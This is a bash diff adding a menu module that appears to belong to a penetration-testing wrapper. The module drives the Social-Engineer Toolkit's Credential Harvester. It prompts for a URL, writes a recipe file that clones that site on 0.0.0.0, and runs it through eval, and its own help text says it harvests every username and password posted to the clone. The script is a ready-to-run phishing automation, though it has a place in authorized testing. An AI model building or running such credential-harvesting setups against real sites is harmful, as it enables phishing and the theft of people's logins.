@@ -1,0 +1,77 @@
+#!/bin/bash
+
+source kp.conf
+source $MODULES_PATH/misc_module.sh
+
+function menu_setoolkit(){
+    clear
+    figlet setools
+    num3 0 "Attack"
+    num2 5 "Social-Engineering" "(setoolkit)"
+    num1 10 "Website_Attack_Vectors" "(Credential_Harvester_Attack)"
+    num9 10 "Back"
+    read -n 1 -s NUM
+    case $NUM in
+    1)
+        cmd_setoolkit
+        ;;
+    9)
+        menu_attack
+        ;;
+    *)
+        ;;
+    esac
+}
+
+function cmd_setoolkit(){
+    clear
+    figlet setoolkit
+    BASE=`pwd`
+    printf "┌─(${PURPLE}$TITLE${NC})${RED}${USERNAME}@${HOSTNAME}${NC}:${YELLOW}[3]Attack${NC} > ${GREEN}[2]Social-Engineering${NC} > ${RED}[1]Website_Attack_Vectors${NC}\n"
+    echo "|"
+    printf "|${RED}  ########  Caution!  ########${NC}\n"
+    echo "|"
+    printf "+${BLUE}usage${NC}: setoolkit (${RED}Run as Root${NC})\n"
+	if [ ! ${EUID:-${UID}} = 0 ];then
+		echo "└─Command > Back"
+	else
+        printf "+${BLUE}Information${NC}:\n"
+        printf "|  The ${WHITE}Credential Harvester${NC} method will utilize web cloning of a web-site\n"
+        echo "|  that has a username and password field and harvest all the information posted to the website."
+        echo "|"
+        echo "|  This method will completely clone a website of your choosing"
+        echo "|  and allow you to utilize the attack vectors within the completely"
+        echo "|  same web application you were attempting to clone."
+        echo "|"
+        read -p "> Enter the url to clone: " URL
+        cat <<EOF >> set_recipe.txt
+1
+2
+3
+2
+0.0.0.0
+$URL
+EOF
+        cd /usr/share/set
+        echo "+  ${YELLOW}Method${NC}   : Credential Harvester"
+        echo "+  ${YELLOW}Clone URL${NC}: $URL"
+        cmd="./seautomate $BASE/set_recipe.txt"
+        echo "└─Command > $cmd"
+        echo ""
+        echo "> You ready?"
+        num1 0 "No"
+        num2 0 "Yes"
+        read -n 1 -s ANS
+        if [ ! -z "$ANS" ];then
+            if [ $ANS = "2" ];then
+                eval $cmd
+            else
+                :
+            fi
+        else
+            :
+        fi
+        cd $BASE
+        rm set_recipe.txt
+    fi
+}
